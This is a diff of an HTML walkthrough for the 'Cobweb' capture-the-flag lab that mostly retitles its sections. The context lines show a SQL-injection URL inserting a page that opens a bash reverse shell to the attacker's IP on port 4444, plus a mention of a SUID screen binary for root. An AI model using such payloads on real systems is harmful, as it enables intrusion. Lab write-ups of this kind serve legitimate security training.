@@ -95,9 +95,9 @@ Service detection performed. Please report any incorrect results at https://nmap
     </pre>
 
 
-    <h2>Port 21</h2>
+    <h2>Information Gathering</h2>
 
-    <li>Downloading files from the ftp server.</li>
+    <li>The files on the ftp server turn out to be the first point of interest.  We need to download them.</li>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cobweb/exfiltrated/ftp]
@@ -152,8 +152,6 @@ ftp&gt; exit
         <li>192.168.118.5 - - [27/Aug/2021:08:47:04 -0400] <mark>"GET /.index.php.swp</mark> HTTP/1.1&quot; 200 5422 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</li>
     </ul>
 
-    <h2>Port 80</h2>
-
     <li>When we visit http://192.168.248.162/.index.php.swp we see some php code involving interaction with the SQL database.  I used curl to download the contents of this page.</li>
 
     <pre>
@@ -164,11 +162,13 @@ ftp&gt; exit
 100   917  100   917    0     0  10188      0 --:--:-- --:--:-- --:--:-- 10188
     </pre>
 
-    <li>I pasted this code into a php beautifier that I found on google to make it easier to read.  I also added comments to the code to give a brief explanation of how we will exploit the code.</li>
+    <li>I pasted this code into a php beautifier that I found on google to make it easier to read.  I also added comments to the code to give a brief explanation of the vulnerabilities in the code and how we will exploit them.</li>
 
     <img src="../images/cobweb/sql_injection.png">
 
-    <li>I send this through Firefox to create a web page containing a reverse shell.</li>
+    <h2>Foothold</h2>
+
+    <li>Now we will exploit this code using a URL sql injection.  I send this through Firefox to create a web page containing a reverse shell.</li>
     <ul>
         <li>http://192.168.248.162/"; INSERT INTO webpages(route_string, page_data) VALUES ('/rev', 'system("bash -i >& /dev/tcp/192.168.49.248/4444 0>&1");');-- -</li>
     </ul>
@@ -178,7 +178,7 @@ ftp&gt; exit
         <li>The reverse shell connects and I gain a shell as the user apache.</li>
     </ul>
 
-    <h2>Getting root</h2>
+    <h2>Privesc - Root</h2>
 
     <li>I search for all files that have the SUID bit set and the one that stands out is screens-4.5.0</li>
 
